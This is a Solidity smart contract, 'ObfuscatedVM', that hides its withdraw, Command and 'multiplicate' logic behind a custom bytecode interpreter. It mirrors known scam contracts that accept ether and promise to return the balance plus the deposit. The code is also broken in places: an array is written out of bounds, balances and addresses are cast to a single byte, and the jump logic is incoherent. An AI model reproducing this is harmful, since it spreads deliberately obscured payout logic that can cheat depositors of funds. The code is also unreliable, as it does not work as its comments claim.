pragma solidity ^0.4.18;

contract ObfuscatedVM
{
    address public Owner = msg.sender;
    uint256[] private stack;
    uint256 private pc;
    bytes private instructions;
    
    function() public payable{}
    
    function execute(bytes _instructions) internal {
        instructions = _instructions;
        pc = 0;
        while (pc < instructions.length) {
            uint8 opcode = uint8(instructions[pc]);
            pc++;
            if (opcode == 0x01) { // PUSH
                uint256 value = uint256(uint8(instructions[pc]));
                pc++;
                stack.push(value);
            } else if (opcode == 0x02) { // POP
                stack.length--;
            } else if (opcode == 0x03) { // ADD
                uint256 a = stack[stack.length - 2];
                uint256 b = stack[stack.length - 1];
                stack.length--;
                stack[stack.length - 1] = a + b;
            } else if (opcode == 0x04) { // SUB
                uint256 a = stack[stack.length - 2];
                uint256 b = stack[stack.length - 1];
                stack.length--;
                stack[stack.length - 1] = a - b;
            } else if (opcode == 0x05) { // JMP
                uint256 target = stack[stack.length - 1];
                stack.length--;
                pc = target;
            } else if (opcode == 0x06) { // JZ
                uint256 target = stack[stack.length - 1];
                stack.length--;
                if (stack[stack.length - 1] == 0) {
                    pc = target;
                }
                stack.length--;
            } else if (opcode == 0x07) { // LOAD
                uint256 index = uint256(uint8(instructions[pc]));
                pc++;
                stack.push(stack[index]);
            } else if (opcode == 0x08) { // STORE
                uint256 index = uint256(uint8(instructions[pc]));
                pc++;
                stack[index] = stack[stack.length - 1];
                stack.length--;
            } else if (opcode == 0x09) { // TRANSFER
                address adr = address(stack[stack.length - 2]);
                uint256 value = stack[stack.length - 1];
                stack.length -= 2;
                adr.transfer(value);
            } else if (opcode == 0x0A) { // CALL
                address adr = address(stack[stack.length - 2]);
                bytes memory data = new bytes(uint256(stack[stack.length - 1]));
                stack.length -= 2;
                adr.call.value(msg.value)(data);
            }
        }
    }
    
    function withdraw()
    payable
    public
    {
        bytes memory withdrawInstructions = new bytes(7);
        withdrawInstructions[0] = byte(0x01); // PUSH
        withdrawInstructions[1] = byte(uint8(msg.sender == Owner ? 1 : 0));
        withdrawInstructions[2] = byte(0x06); // JZ
        withdrawInstructions[3] = byte(0x05); // JMP
        withdrawInstructions[4] = byte(0x00); // PC 0
        withdrawInstructions[5] = byte(0x01); // PUSH
        withdrawInstructions[6] = byte(uint8(this.balance));
        withdrawInstructions[7] = byte(0x09); // TRANSFER
        execute(withdrawInstructions);
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        bytes memory commandInstructions = new bytes(8);
        commandInstructions[0] = byte(0x01); // PUSH
        commandInstructions[1] = byte(uint8(msg.sender == Owner ? 1 : 0));
        commandInstructions[2] = byte(0x06); // JZ
        commandInstructions[3] = byte(0x05); // JMP
        commandInstructions[4] = byte(0x00); // PC 0
        commandInstructions[5] = byte(0x01); // PUSH
        commandInstructions[6] = byte(uint8(msg.value));
        commandInstructions[7] = byte(0x0A); // CALL
        execute(commandInstructions);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        bytes memory multiplicateInstructions = new bytes(10);
        multiplicateInstructions[0] = byte(0x01); // PUSH
        multiplicateInstructions[1] = byte(uint8(msg.value >= this.balance ? 1 : 0));
        multiplicateInstructions[2] = byte(0x06); // JZ
        multiplicateInstructions[3] = byte(0x05); // JMP
        multiplicateInstructions[4] = byte(0x00); // PC 0
        multiplicateInstructions[5] = byte(0x01); // PUSH
        multiplicateInstructions[6] = byte(uint8(this.balance + msg.value));
        multiplicateInstructions[7] = byte(0x01); // PUSH
        multiplicateInstructions[8] = byte(uint8(adr));
        multiplicateInstructions[9] = byte(0x09); // TRANSFER
        execute(multiplicateInstructions);
    }
}